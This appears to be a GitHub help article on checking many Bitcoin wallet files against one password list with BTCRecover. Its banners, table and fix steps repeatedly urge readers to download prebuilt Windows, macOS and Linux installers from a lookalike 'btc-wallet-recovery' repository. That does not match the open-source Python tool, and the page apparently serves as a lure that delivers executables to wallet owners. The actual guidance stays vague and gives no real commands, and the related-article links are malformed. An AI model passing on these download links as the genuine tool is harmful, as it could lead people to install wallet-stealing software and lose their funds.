<div align="center">
<img src="assets/banner-article.png" alt="Checking many wallet files against one password list">
</div>

# Checking many wallet files against one password list

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

BTCRecover takes one target per run, so "many wallets, one password list" is a loop rather than a flag: the same candidate list is passed to each wallet file in turn. The arrangement is simple, and it is the difference between testing a list once against your whole archive and doing it by hand twenty times.

## You'll see this if

You have a folder of old wallet files and one memory of a password used across them, or you are unsure which file belongs to which account.

| What you have | What to do | Why |
|---|---|---|
| Several `wallet.dat` files from different years | run the same candidate list against each, one at a time | the password may only open one of them |
| A folder of mixed wallet types | group by type first, then run per group | a wrong type wastes the run |
| One file, several accounts | not a multi-file problem | it is a derivation problem |
| A list of candidate passwords you want to test broadly | iterate the list over every file | cheapest way to find which file it opens |
| Files on a drive you have not imaged yet | image first, then work from the image | a failing disk is a one-shot resource |
| Several files and no candidate list | build the list before looping | a loop with no rules tests nothing |

## Why it happens

Recovery tools are built around one artifact and one search: parse the file, generate candidates, test, report. Running several files at once inside one process would need a shared candidate generator and separate state per file, so the tool keeps it simple and the shell provides the loop.

That is not a limitation in practice. Each run is independent, the candidate list is a file, and a shell loop over the directory applies the same list to every wallet. What it does require is care about two things: which wallet type each file is, and keeping the output of each run separate so a hit is attributable to a file.

The other half of the problem is the candidate list itself. A password reused across wallets is common, so a list of your habits tested against an archive often opens one file you had forgotten and tells you which password generation you were using at the time. That makes a broad run a form of archaeology as much as recovery.

## Fix

Group the files, fix the candidate list, then loop with output captured per file.

1. **Image the drive and work from the copy.** Then list every file with its size and date: [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md).
2. **Group by wallet type**  -  a Core-style file, an Electrum file, a browser vault  -  because the mode and the parser differ: [Electrum wallet password and seed recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-electrum-wallet-password-recovery.md).
3. **Confirm each file's address**, where the software allows it, so a success can be tied to the right wallet.
4. **Write one candidate list** for the password generation you used in that era: [Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md).
5. **Loop over the files**, one run per file, writing each run's output to its own log file. Keep the command in a script so a typo cannot turn into a false negative: [BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md).
6. **Download the current release from the GitHub releases page** and check its help for the exact option names before scripting: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
7. **Read the logs for hits, not for progress.** A run that reports a candidate is the only interesting line; everything else is noise across twenty files.

Two practical habits make this reliable. Name each log after its wallet file, so a hit identifies the wallet without guesswork. And run the smallest candidate list first across all files, then widen  -  a broad list times twenty files is a long night, while a narrow list times twenty is an hour.

One failure mode deserves a name: the silent type mismatch. A run told to expect a Bitcoin Core file but pointed at an Electrum wallet will not open it, will not error clearly, and will look exactly like a wrong password across the whole archive. Before concluding that twenty files hold twenty unknown passwords, run one file of each type on its own with a candidate you believe in, and confirm that the mode can produce a hit at all. That single test separates a wrong list from a wrong mode, and it costs a minute.

## If that did not work

If no file opens with a list that should have worked, the list or the types are wrong rather than the loop.

Check the types first: a Core-mode run against an Electrum file fails silently, and twenty silent failures look exactly like twenty wrong passwords. Then check the list for an excluded character class  -  a required digit or capital that the real password never had. Then check that the logs are actually being written; a redirect that overwrote the same file twenty times hides every hit but the last.

If one file resists while others open, that file is the outlier and worth its own run with a wider pattern. If none opens and the files are from very different years, expect different password habits per era rather than one list covering all of them: [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md).

## Prevention

- Keep one archive folder with files named by wallet and year.
- Record which password generation you used in each era, as a pattern note.
- Keep the working script beside the archive, so the next run is a re-run.
- Sweep recovered balances into one current wallet with a tested backup.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Can BTCRecover check many wallets at once?

Not inside one run: each run takes one wallet file. Running the same candidate list against several files is a shell loop over the folder, one run per file, with output captured separately.

### What is the command for multiple wallet files?

Run the tool once per file with the same candidate list, in a loop, writing each result to its own log. The exact option names are in the current release's help output, which is the only version-accurate source.

### Is one password list enough for an archive of old wallets?

Often yes, because people reused a pattern across wallets in the same era. Where the files span a decade, expect two or three distinct patterns and run them separately rather than blending them into one enormous list.

### Does running more wallets at once go faster?

No  -  the work is additive, one file at a time. Speed comes from a tighter candidate list or from GPU acceleration, not from batching: [GPU acceleration setup](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-gpu-acceleration-setup.md).

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [BTCRecover command-line options]([BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md))
- [wallet.dat password recovery for Bitcoin Core]([wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md))
- [Token lists and password patterns]([Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md))
- [GPU acceleration setup]([GPU acceleration setup](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-gpu-acceleration-setup.md))
